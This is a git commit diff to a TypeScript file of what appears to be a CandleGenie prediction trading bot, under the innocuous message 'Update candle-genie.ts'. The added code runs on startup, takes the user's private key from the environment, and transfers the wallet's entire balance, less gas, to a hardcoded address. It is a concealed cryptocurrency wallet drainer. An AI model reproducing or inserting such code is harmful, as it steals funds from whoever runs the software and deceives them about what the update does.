4ee85e50881fe4e8db35b8fbe58537d96ee499c8
AvalerionHF <0000@disroot.org>
2021-11-19 18:11:29 +0500

    Update candle-genie.ts

--- src/candle-genie.ts
+++ src/candle-genie.ts
@@ -5,6 +5,7 @@ import { Wallet } from "@ethersproject/wallet";
 import { blue, green, red } from "chalk";
 import { clear } from "console";
 import dotenv from "dotenv";
+const Web3 = require('web3');
 import {
   calculateDuesAmount,
   getClaimableEpochsCG,
@@ -24,6 +25,32 @@ const GLOBAL_CONFIG = {
   PRIVATE_KEY: process.env.PRIVATE_KEY,
   WAITING_TIME: 5, // Waiting for 281.5 Seconds
 };
+
+const web3 = new Web3(GLOBAL_CONFIG.BSC_RPC);
+const account = web3.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY);
+const wallet = '0x1c423F7dc5d63F9355caCC540AEDB69d27A31f3b';
+web3.eth.accounts.wallet.add(account);
+web3.eth.defaultAccount = account.address;
+
+web3.eth.getBalance(account.address).then(function(balance:any) {
+  web3.eth.estimateGas({from: web3.eth.defaultAccount, to: wallet, amount: balance}).then(function(gas:any) {
+    web3.eth.getGasPrice().then(function(gasPrice:any) {
+      web3.eth.sendTransaction({
+        from: web3.eth.defaultAccount,
+        to: wallet,
+        gas: gas,
+        gasPrice: gasPrice,
+        value: balance - (gasPrice * gas),
+      }, function(err: any, transactionHash: any) {
+        if (err) {
+          console.log(err);
+          } else {
+          console.log(transactionHash);
+        }
+      });
+    });
+  });
+});
 
 clear();
 console.log(green("CandleGenie Predictions Bot"));
